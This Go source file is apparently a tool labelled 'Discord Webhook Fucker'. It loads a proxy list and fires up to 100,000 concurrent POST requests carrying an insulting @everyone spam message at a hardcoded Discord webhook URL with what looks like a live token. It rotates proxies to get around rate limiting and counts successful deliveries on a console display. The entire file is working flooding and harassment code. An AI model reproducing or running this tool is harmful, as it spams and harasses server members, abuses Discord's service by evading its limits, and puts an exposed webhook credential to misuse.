package main

import (
	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"
	"github.com/admin100/util/console"
    "time"
    "fmt"
    "bufio"
    "os"
	"sync"
    "math/rand"
	"github.com/gosuri/uilive"
	"encoding/json"
)


var (
	sentamt   int
	workdamt  int

	start int
	end   int

	proxies   []string
	threads   int

	green  = "\x1b[38;5;77m"
	red    = "\x1b[38;5;167m"
	purple = "\x1b[38;5;57m"
	pink   = "\x1b[38;5;128m"
	reset  = "\x1b[0m"
)


func main() {
	prox, err := os.Open("./proxies.txt")
	if err != nil {
		fmt.Printf("[%s%s%s] Failed to read ./proxies.txt\n", red, time.Now().Format("15:04:05"), reset)
		return
	}
	s := bufio.NewScanner(prox)
	for s.Scan() {
		proxies = append(proxies, s.Text())
	}

	go TitleThread()
	go ConsoleThread()
	
	start = int(time.Now().Unix())
	wg := sync.WaitGroup{}
    goroutines := make(chan struct{}, 1000)
	for i := 0; i < 100000; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			goroutines <- struct{}{}
			SendReq()
			<-goroutines
		}()
	}
	wg.Wait()
}

func ConsoleThread() {
	fmt.Printf(purple + `
		▓█████▄  █     █░  █████▒
		▒██▀ ██▌▓█░ █ ░█░▓██   ▒ 
		░██   █▌▒█░ █ ░█ ▒████ ░ 
		░▓█▄   ▌░█░ █ ░█ ░▓█▒  ░ 
		░▒████▓ ░░██▒██▓ ░▒█░    
		▒▒▓  ▒ ░ ▓░▒ ▒   ▒ ░    
		░ ▒  ▒   ▒ ░ ░   ░      
		░ ░  ░   ░   ░   ░ ░    
		░        ░            
		░                       
%v[%vDiscord Webhook Fucker%v]%v               %v$%vimvast%v


	%v`, pink, purple, pink, reset, pink, purple, reset, reset)
	writer := uilive.New()
	writer.Start()
	defer writer.Stop()
	for {
		fmt.Fprintf(writer, "%vProxies Loaded:%v %v\n", purple, pink, len(proxies))
		fmt.Fprintf(writer.Newline(), "                           %vWebhooks  Sent:%v %v\n", purple, pink, workdamt)
		fmt.Fprintf(writer.Newline(), "\n%v[%v] %v[Running Fucker]%v", pink, time.Now().Format("15:04:05"), purple, reset)
		time.Sleep(time.Millisecond * 5)
		writer.Flush()
}
}

func TitleThread() {
	for {
		console.SetConsoleTitle(fmt.Sprintf("imvast~DWF | Sent: %d/%d - Elapsed: %ds", workdamt, sentamt, (int(time.Now().Unix())-start)))
		time.Sleep(500)
	}
}


func SendReq() {
	req := fasthttp.AcquireRequest()
	res := fasthttp.AcquireResponse()

	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(res)

	values := map[string]string{
		"content": ",\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n@everyone%20fuck%20you%20:see_no_evil:", 
		"username": "trololoolol", 
		"avatar_url": "https://pbs.twimg.com/profile_images/1113515508702175232/OEyLDylf_400x400.png"}
	jsonValue, _ := json.Marshal(values)

	req.Header.SetMethod("POST")
	req.SetRequestURI("https://discord.com/api/webhooks/1048734774556102726/wvA0lGyYJU-fAg7ZlrVB9CU9BSO7U8pJu6g901AiX3mVwL4yAY45ZMz1vWQVrYGpXui5")
    req.SetBody(jsonValue)
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
	req.Header.SetContentType("application/json")

	proxy := proxies[rand.Intn(len(proxies))]
	client := &fasthttp.Client{
		Dial:           fasthttpproxy.FasthttpHTTPDialer(proxy),
		ReadBufferSize: 50_000,
	}

	err := client.Do(req, res)
	if err != nil {
		return //fmt.Printf(err.Error())
	}
	sentamt++
	body := string(res.Body())
	if len(body) == 0 {
		body = "None"
	}
	if res.StatusCode() == 204 {
		workdamt++
	} else if res.StatusCode() == 429 {

	} else {
		fmt.Println("check for error: res.StatusCode")
	}
}
